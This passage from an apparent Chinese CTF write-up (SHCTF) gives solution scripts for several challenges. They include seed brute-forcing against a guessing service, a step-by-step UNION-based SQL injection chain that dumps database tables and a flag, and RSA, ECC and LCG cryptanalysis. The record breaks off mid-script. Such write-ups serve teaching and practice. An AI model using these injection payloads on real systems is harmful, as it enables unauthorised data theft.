class="keyword">as</span> file:</span><br><span class="line">            <span class="keyword">return</span> file.read()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;nonono&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>():</span><br><span class="line">    <span class="keyword">global</span> seed, first_num, second_num</span><br><span class="line">    seed = random.randint(<span class="number">1000000</span>,<span class="number">9999999</span>)</span><br><span class="line">    random.seed(seed)</span><br><span class="line">    first_num = random.randint(<span class="number">1000000000</span>,<span class="number">9999999999</span>)</span><br><span class="line">    second_num = random.randint(<span class="number">1000000000</span>,<span class="number">9999999999</span>)</span><br><span class="line"></span><br><span class="line">init()</span><br><span class="line">app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>随机数种子缺陷</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">first_num = <span class="number">5277451103</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">1000000</span>, <span class="number">9999999</span>)):</span><br><span class="line">    random.seed(i)</span><br><span class="line">    test = random.randint(<span class="number">1000000000</span>, <span class="number">9999999999</span>)</span><br><span class="line">    <span class="keyword">if</span> test == first_num:</span><br><span class="line">        second_num = random.randint(<span class="number">1000000000</span>, <span class="number">9999999999</span>)</span><br><span class="line">        res = requests.get(</span><br><span class="line">            <span class="string">f&#x27;http://210.44.150.15:25622/guess?num=<span class="subst">&#123;second_num&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(res.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="自助查询"><a class="markdownIt-Anchor" href="#自助查询"></a> 自助查询</h3><p><code>?id=&quot;) or 1=1#</code>，先闭合看看能不能实现注入，很明显看见只有两列<br /><img src="https://picx.zhimg.com/80/v2-eb4952a524f61c3edf5729c210877257_1440w.png" alt="" /></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username,password <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> (&quot;1&quot;) <span class="keyword">or</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database()#</span><br><span class="line">库名：ctf</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> username,password <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> (&quot;1&quot;) <span class="keyword">or</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;ctf&#x27;</span>#</span><br><span class="line">表名：flag,users</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> username,password <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> (&quot;1&quot;) <span class="keyword">or</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span>#</span><br><span class="line">flag表的字段名：id,scretdata</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> username,password <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> (&quot;1&quot;) <span class="keyword">or</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span></span><br><span class="line">users表的字段名：id,username,password,<span class="keyword">USER</span>,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> username,password <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> (&quot;1&quot;) <span class="keyword">or</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(scretdata) <span class="keyword">from</span> flag#</span><br><span class="line">被你查到了, 果然不安全,把重要的东西写在注释就不会忘了</span><br></pre></td></tr></table></figure><p>对列进行查询</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 查列名</span><br><span class="line"><span class="keyword">SELECT</span> username,password <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> (&quot;1&quot;) <span class="keyword">or</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">SELECT</span> database(),column_name <span class="keyword">FROM</span> information_schema.columns</span><br><span class="line"># 查列内容</span><br><span class="line"><span class="keyword">SELECT</span> username,password <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> (&quot;1&quot;) <span class="keyword">or</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">SELECT</span> database(),column_comment <span class="keyword">FROM</span> information_schema.columns</span><br></pre></td></tr></table></figure><h2 id="crypto-2"><a class="markdownIt-Anchor" href="#crypto-2"></a> crypto</h2><h3 id="worde很大"><a class="markdownIt-Anchor" href="#worde很大"></a> worde很大</h3><p>题目</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> enc <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = getPrime(<span class="number">200</span>)</span><br><span class="line">d = gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">dp = d % (p-<span class="number">1</span>)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;dp = <span class="subst">&#123;dp&#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 82247919658489810380240839087349167312391675556067956600144360018088524333106039088812004869379422909437743425492911024763226188814125737536109723777661903520234200005812281602815883855435148880431018374620973909944500345461605934516034328785791858741385301710414531253610756328999895737908157933318003199437</span></span><br><span class="line"><span class="string">c = 19004135050577774560981288431097099079736191413880885912007978892726509267290991113342873896047249218117502631896913170767293584589689916540020860025359287210204445330821495515587691705398818016395710639666764267452777850179744742716838946605733861264261086076963704643146910966580500292644632757738898750640</span></span><br><span class="line"><span class="string">e = 1222271536436538502303564845180492076631965040858206171530223</span></span><br><span class="line"><span class="string">dp = 5756836428205079089595585945891670886537656746897710776494815731928932139888141976203071290262270694899459619924115230892248604680645140941830553958594301</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>见<a href="https://hvang10.github.io/2024/08/12/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E5%B1%B1%E7%9F%B3CTF%E8%AE%AD%E7%BB%83%E8%90%A5/">https://hvang10.github.io/2024/08/12/第四届山石CTF训练营/</a><br /><code>babyrsa</code>，构造费马</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p = GCD(<span class="built_in">pow</span>(<span class="number">2</span>, e*dp, n)-<span class="number">2</span>, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, dp, p)))</span><br></pre></td></tr></table></figure><h3 id="魔鬼的步伐"><a class="markdownIt-Anchor" href="#魔鬼的步伐"></a> 魔鬼的步伐</h3><p>题目</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice</span><br><span class="line"><span class="keyword">from</span> enc <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_primes</span>(<span class="params">limit</span>):</span><br><span class="line">    primes = []</span><br><span class="line">    is_prime = [<span class="literal">True</span>] * (limit + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, limit + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> is_prime[num]:</span><br><span class="line">            primes.append(num)</span><br><span class="line">            <span class="keyword">for</span> multiple <span class="keyword">in</span> <span class="built_in">range</span>(num * num, limit + <span class="number">1</span>, num):</span><br><span class="line">                is_prime[multiple] = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> primes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_Prime</span>(<span class="params">bits</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        n = <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> n.bit_length() &lt; bits:</span><br><span class="line">            n *= choice(primes)</span><br><span class="line">        <span class="keyword">if</span> isPrime(n + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> n + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">primes = get_primes(e)</span><br><span class="line">p = get_Prime(<span class="number">512</span>)</span><br><span class="line">q = get_Prime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 33049334433301642832276449462878199425586003075363704632299361359635418571202120149638949400299018113342381561003380476578452867397448279205470367999826880102323557636492461892702632205491422046049109130726973943645824051991662952301697690337766318065326751352192106485980054784289527854584092550645702701746223881</span></span><br><span class="line"><span class="string">e = 65537</span></span><br><span class="line"><span class="string">c = 15394419310248814507510133312306135076155666347831968302673818044165993197079455389123001640582969004883715894754137770792509616543743423839219703779259418731422736400578259902468529503256749854724887132016186964074984277399760948419395368792639982783770903783472249503330890702692418839718262891255865389875185554</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><code>get_primes()</code>函数是基于埃拉托斯特尼筛法<code>Sieve of Eratosthenes</code>的变种，它是一种高效的找出一定范围内所有素数的方法，<code>isPrime(n + 1)</code>，可以得到本题的考点为<code>p-1</code>光滑</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = </span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Poolard_p_1</span>(<span class="params">N</span>):</span><br><span class="line">    a, n = <span class="number">2</span>, <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        a = <span class="built_in">pow</span>(a, n, N)</span><br><span class="line">        res = GCD(a-<span class="number">1</span>, N)</span><br><span class="line">        <span class="keyword">if</span> res != <span class="number">1</span> <span class="keyword">and</span> res != N:</span><br><span class="line">            q = N // res</span><br><span class="line">            <span class="keyword">return</span> res, q</span><br><span class="line">        n += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">p, q = Poolard_p_1(n)</span><br><span class="line">d = inverse(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, d, n)).decode())</span><br></pre></td></tr></table></figure><h3 id="ezecc"><a class="markdownIt-Anchor" href="#ezecc"></a> ezECC</h3><p>题目</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">b&#x27;SHCTF&#123;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">m = next_prime(bytes_to_long(flag))</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">a,b = getPrime(<span class="number">128</span>),getPrime(<span class="number">128</span>)</span><br><span class="line">E = EllipticCurve(Zmod(p),[a,b])</span><br><span class="line">k = getPrime(<span class="number">256</span>)</span><br><span class="line">A1 = E.random_point()</span><br><span class="line">A2 = A1*k</span><br><span class="line">M = E.lift_x(m)</span><br><span class="line">C = M+A2</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p = &#x27;</span>,p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;k = &#x27;</span>,k)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;A1 = &#x27;</span>,A1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;C = &#x27;</span>,C)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">p =  9799485259524549113003780400336995829253375211044694607315372450399356814285244762186468904824132005209991983177601498069896166228214442123763065076327679</span></span><br><span class="line"><span class="string">k =  73771953838487511457389800773038323262861649769228176071578897500004883270121</span></span><br><span class="line"><span class="string">A1 =  (5945412329827707694132352090606154232045921322662767755331097180167148601629747751274580872108985870208681845078153424348847330421799769770041805208089791 : 4113102573821904570542216004200810877456931033522276527318388416329888348077285857968081007666714313806776668203284797556825595791189566621228705928598709 : 1)</span></span><br><span class="line"><span class="string">C = (2336301464307188733995312208152021176388718095735565422234047912672553316288080052957448196669174030921526180747767251838308335308474037066343018337141276 : 6868888273736103386336636953449998615833854869329393895956720058438723636197866928342387693671211918574357564701700555086194574821628053750572619551290025 : 1)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>通过给定的两个点，求出ab，问了一下出题人，题目信息貌似并不完全正确，得在前一个素数和当前素数之间进行爆破</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p =  <span class="number">9799485259524549113003780400336995829253375211044694607315372450399356814285244762186468904824132005209991983177601498069896166228214442123763065076327679</span></span><br><span class="line">k =  <span class="number">73771953838487511457389800773038323262861649769228176071578897500004883270121</span></span><br><span class="line">A1 =  (<span class="number">5945412329827707694132352090606154232045921322662767755331097180167148601629747751274580872108985870208681845078153424348847330421799769770041805208089791</span> , <span class="number">4113102573821904570542216004200810877456931033522276527318388416329888348077285857968081007666714313806776668203284797556825595791189566621228705928598709</span>)</span><br><span class="line">C = (<span class="number">2336301464307188733995312208152021176388718095735565422234047912672553316288080052957448196669174030921526180747767251838308335308474037066343018337141276</span> , <span class="number">6868888273736103386336636953449998615833854869329393895956720058438723636197866928342387693671211918574357564701700555086194574821628053750572619551290025</span>)</span><br><span class="line">a=<span class="built_in">int</span>(inverse(A1[<span class="number">0</span>]-C[<span class="number">0</span>],p)*(A1[<span class="number">1</span>]^<span class="number">2</span>-C[<span class="number">1</span>]^<span class="number">2</span>-A1[<span class="number">0</span>]^<span class="number">3</span>+C[<span class="number">0</span>]^<span class="number">3</span>)%p)</span><br><span class="line">b=<span class="built_in">int</span>((A1[<span class="number">1</span>]^<span class="number">2</span>-A1[<span class="number">0</span>]^<span class="number">3</span>-a*A1[<span class="number">0</span>])%p)</span><br><span class="line">E = EllipticCurve(Zmod(p),[a,b])</span><br><span class="line">C = E.point(C)</span><br><span class="line">A1 = E.point(A1)</span><br><span class="line">m = C-A1*k</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;m = <span class="subst">&#123;m[<span class="number">0</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment"># python</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line">m = <span class="number">133829459905635890502862981237631940794467118483270617546174979</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line">m1 = prevprime(m)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m1))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m1, m):</span><br><span class="line">    flag = long_to_bytes(i)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;&#125;&#x27;</span> == flag[-<span class="number">1</span>:]:</span><br><span class="line">        <span class="built_in">print</span>(flag.decode())</span><br></pre></td></tr></table></figure><h3 id="pading"><a class="markdownIt-Anchor" href="#pading"></a> pading</h3><p>题目</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">flag = <span class="string">b&#x27;SHCTF&#123;********&#125;&#x27;</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) == <span class="number">39</span></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">0x3</span></span><br><span class="line">pad = <span class="string">b&#x27;a_easy_problem&#x27;</span></span><br><span class="line">c = <span class="built_in">pow</span>(bytes_to_long(flag + pad),e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 97267171048088381496066192626635197453217164564868791036244179896351325689651647300515730561304963255114869511478914996031421842629280169299477338281118325550531655231549821271665600124109279443980829977781199806450042470016020636640703547622978932751689687167828765412348742136309101175003219210818245550233</span></span><br><span class="line"><span class="string">c = 45010260588576847169114899728599361533379262804019563744039173126890376093283589687354320048969349244237974443778624464334226062734150084458832462402162698053900389565767914602287253167328691766940007844822055298249437834407081828025295154876721602702763359699362974932711252222438004294561141105423731699107</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>打<strong>m高低位泄露</strong>且低加密指数</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">97267171048088381496066192626635197453217164564868791036244179896351325689651647300515730561304963255114869511478914996031421842629280169299477338281118325550531655231549821271665600124109279443980829977781199806450042470016020636640703547622978932751689687167828765412348742136309101175003219210818245550233</span></span><br><span class="line">c = <span class="number">45010260588576847169114899728599361533379262804019563744039173126890376093283589687354320048969349244237974443778624464334226062734150084458832462402162698053900389565767914602287253167328691766940007844822055298249437834407081828025295154876721602702763359699362974932711252222438004294561141105423731699107</span></span><br><span class="line">m_high = bytes_to_long(<span class="string">b&#x27;SHCTF&#123;&#x27;</span>)</span><br><span class="line">m_low = bytes_to_long(<span class="string">b&#x27;&#125;a_easy_problem&#x27;</span>)</span><br><span class="line"><span class="comment"># 6+32+15</span></span><br><span class="line">R.&lt; x &gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = ((m_high &lt;&lt; <span class="number">376</span>)+x*<span class="number">2</span> ^ <span class="number">120</span>+m_low)^<span class="number">3</span>-c</span><br><span class="line">f = f.monic()</span><br><span class="line"><span class="comment"># 未知m中间的256位</span></span><br><span class="line">roots = f.small_roots(X=<span class="number">2</span> ^ <span class="number">256</span>, beta=<span class="number">0.4</span>,epsilon=<span class="number">0.02</span>)</span><br><span class="line"><span class="keyword">for</span> root <span class="keyword">in</span> roots:</span><br><span class="line">    m = (m_high &lt;&lt; <span class="number">376</span>)+<span class="built_in">int</span>(root)*<span class="number">2</span> ^ <span class="number">120</span>+m_low</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)).decode())</span><br></pre></td></tr></table></figure><h3 id="er"><a class="markdownIt-Anchor" href="#er"></a> E&amp;R</h3><p>题目</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">flag = flag[<span class="number">6</span>:-<span class="number">1</span>]</span><br><span class="line">l = <span class="built_in">len</span>(flag)</span><br><span class="line">m1 = bytes_to_long(flag[:l//<span class="number">2</span>])</span><br><span class="line">m2 = bytes_to_long(flag[l//<span class="number">2</span>:])</span><br><span class="line"><span class="comment">#RSA</span></span><br><span class="line">p = getPrime(<span class="number">256</span>)</span><br><span class="line">q = getPrime(<span class="number">256</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">r_q = <span class="built_in">int</span>(<span class="built_in">bin</span>(q)[<span class="number">2</span>:][::-<span class="number">1</span>] , <span class="number">2</span>)</span><br><span class="line">leak = p ^^ r_q</span><br><span class="line">c = <span class="built_in">pow</span>(m2,e,n)</span><br><span class="line"></span><br><span class="line"><span class="comment">#ECC</span></span><br><span class="line">E = EllipticCurve(Zmod(n),[<span class="number">114514</span>,<span class="number">1919810</span>])</span><br><span class="line">G = E.lift_x(Integer(m1))</span><br><span class="line">P = G * e</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;leak = <span class="subst">&#123;leak&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;P = <span class="subst">&#123;P&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment"># leak = 5599968251197363876087002284371721787318931284225671549507477934076746561842</span></span><br><span class="line"><span class="comment"># n = 7120275986401660066259983193598830554385933355254283093021239164350142898387660104515624591378875067038235085428170557400012848874756868985306042421950909</span></span><br><span class="line"><span class="comment"># c = 6803450117490196163076010186755045681029929816618361161925865477601994608941714788803007124967390157378525581080320415602012078322064392991884070073083436</span></span><br><span class="line"><span class="comment"># P = (4143131125485719352848137000299706175276016714942734255688381872061184989156686585992844083387698688432978380177564346382756951426943827434190895490233627 : 3879946878859691332371384275396678851932267609535096278038417524609690721322205780110680003522999409696718745532857001461869452116434787256032366267905519 : 1)</span></span><br></pre></td></tr></table></figure><p>说实话<code>leak = p ^^ r_q</code>这个是干嘛的，如果真搞<code>p</code>异或<code>q</code>的反二进制数，确实会很棘手<br />但这里，<code>n</code>是可以直接分解的(这算非预期吧)，然后解<code>ECC</code>的时候，换成<code>p</code>的整数环<code>Zmod(p)</code>即可</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">7120275986401660066259983193598830554385933355254283093021239164350142898387660104515624591378875067038235085428170557400012848874756868985306042421950909</span></span><br><span class="line">c = <span class="number">6803450117490196163076010186755045681029929816618361161925865477601994608941714788803007124967390157378525581080320415602012078322064392991884070073083436</span></span><br><span class="line">P = (<span class="number">4143131125485719352848137000299706175276016714942734255688381872061184989156686585992844083387698688432978380177564346382756951426943827434190895490233627</span> , <span class="number">3879946878859691332371384275396678851932267609535096278038417524609690721322205780110680003522999409696718745532857001461869452116434787256032366267905519</span>)</span><br><span class="line">p, q = <span class="number">64760524083545528318139240449356269097871629401328435356643510319660757701117</span>, <span class="number">109947782034870726628911928816041880655659770652764045401662566933641952899777</span></span><br><span class="line">E = EllipticCurve(Zmod(p),[<span class="number">114514</span>,<span class="number">1919810</span>])</span><br><span class="line">d = inverse(e,E.order())</span><br><span class="line">P = E.point(P)</span><br><span class="line">G = P*d</span><br><span class="line">m1 = long_to_bytes(<span class="built_in">int</span>(G[<span class="number">0</span>])).decode()</span><br><span class="line">m2 = long_to_bytes(<span class="built_in">int</span>(<span class="built_in">pow</span>(c, inverse(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>)), n))).decode()  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;SHCTF&#123;&#x27;</span>+m1+m2+<span class="string">&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="misc-2"><a class="markdownIt-Anchor" href="#misc-2"></a> misc</h2><h3 id="拜师之旅2"><a class="markdownIt-Anchor" href="#拜师之旅2"></a> 拜师之旅②</h3><p><img src="https://pic1.zhimg.com/80/v2-5461fd30fd23e433086e0a154e8e6fbe_1440w.png" alt="" /><br />这里其实有两张图片，并不是<code>IDAT块隐写</code></p><h3 id="遮遮掩掩ccrc"><a class="markdownIt-Anchor" href="#遮遮掩掩ccrc"></a> 遮遮掩掩?CCRC!()</h3><p>很奇怪的是脚本、工具都没爆出来，然后就不管了</p><h1 id="week3"><a class="markdownIt-Anchor" href="#week3"></a> week3</h1><h2 id="crypto-3"><a class="markdownIt-Anchor" href="#crypto-3"></a> Crypto</h2><p>这一周的格，非常有意思</p><h3 id="babylcg"><a class="markdownIt-Anchor" href="#babylcg"></a> babyLCG</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> enc <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">seed = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">a = getPrime(<span class="number">400</span>)</span><br><span class="line">b = getPrime(<span class="number">400</span>)</span><br><span class="line">p = getPrime(<span class="number">400</span>)</span><br><span class="line">c = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    seed = (seed*a+b)%p</span><br><span class="line">    c.append(seed&gt;&gt;<span class="number">80</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;a = <span class="subst">&#123;a&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;b = <span class="subst">&#123;b&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;p = <span class="subst">&#123;p&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><p>见<a href="https://www.anquanke.com/post/id/204846">https://www.anquanke.com/post/id/204846</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a = <span class="number">1372883756826335643900860677787413612322429341217562408695781600316979078457258981362973089185243041545146300735285019651</span></span><br><span class="line">b = <span class="number">1616840322678459360621150855366547863164363611723115131556281462274428722388780711443259966667402642255207063489033321533</span></span><br><span class="line">m = <span class="number">2141565647927890574190887477298374865093041664871165032669749937281208305153989668560224928991546602875840458004855584463</span></span><br><span class="line">h = [<span class="number">0</span>,<span class="number">1443574395247483148644856057251704784021992383977243317841569027284868510933981790366865421760703</span>,</span><br><span class="line">     <span class="number">183069754718902282305773783141952247255212452217012040185014286070868216807079491063768977456425</span>, </span><br><span class="line">     <span class="number">656882922755950063291884479762100383247622967393669466357663276997189742661779445200175739121700</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(h)):</span><br><span class="line">    h[i] &lt;&lt;= <span class="number">80</span></span><br><span class="line">A = [<span class="number">1</span>]</span><br><span class="line">B = [<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span 